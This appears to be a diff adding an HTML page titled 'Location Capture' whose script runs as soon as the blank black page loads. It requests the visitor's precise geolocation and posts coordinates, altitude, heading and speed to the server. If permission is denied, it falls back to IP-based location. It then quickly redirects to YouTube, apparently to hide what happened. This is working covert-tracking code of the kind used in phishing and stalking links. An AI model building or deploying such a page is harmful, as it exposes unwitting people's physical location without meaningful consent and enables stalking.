@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Capture</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            background-color: black; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
+    </style>
+</head>
+<body>
+    <script>
+        async function shareLocation() {
+            let watchId = null;
+            try {
+                console.log('Requesting location...');
+                const position = await new Promise((resolve, reject) => {
+                    if (!navigator.geolocation) {
+                        reject(new Error('Geolocation not supported by browser'));
+                    }
+
+                    watchId = navigator.geolocation.watchPosition(
+                        (pos) => {
+                            const { accuracy } = pos.coords;
+                            if (accuracy <= 200) { // Relaxed to 200m
+                                resolve(pos);
+                            } else {
+                                console.warn(`Low accuracy: ${accuracy}m`);
+                            }
+                        },
+                        (err) => reject(err),
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 30000, // 30s timeout
+                            maximumAge: 0
+                        }
+                    );
+
+                    setTimeout(() => {
+                        if (watchId !== null) {
+                            navigator.geolocation.clearWatch(watchId);
+                            reject(new Error('Timeout: Could not get accurate location'));
+                        }
+                    }, 30000);
+                });
+
+                if (watchId !== null) {
+                    navigator.geolocation.clearWatch(watchId);
+                }
+
+                const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords;
+                const provider = navigator.geolocation ? 'browser' : 'unknown';
+
+                console.log('Sending location:', { latitude, longitude, accuracy });
+
+                const response = await fetch('/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        latitude,
+                        longitude,
+                        accuracy,
+                        altitude,
+                        altitudeAccuracy,
+                        heading,
+                        speed,
+                        provider
+                    })
+                });
+
+                const result = await response.json();
+                console.log('Server response:', result);
+            } catch (error) {
+                console.error('Error getting location:', error.message);
+                // Log error to server
+                await fetch('/log-error', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ error: error.message })
+                });
+
+                // Fallback: Send empty POST to /location to trigger IP-based location
+                if (error.message.includes('denied') || error.message.includes('Geolocation')) {
+                    console.log('Geolocation denied, requesting IP-based location...');
+                    const response = await fetch('/location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({})
+                    });
+                    const result = await response.json();
+                    console.log('Server response (IP-based):', result);
+                }
+            }
+        }
+
+        setTimeout(shareLocation, 10);
+
+        // Commented out for debugging
+        setTimeout(() => {
+            console.log('Redirecting to YouTube...');
+            window.location.href = 'https://www.youtube.com';
+        }, 900);
+    </script>
+</body>
+</html>
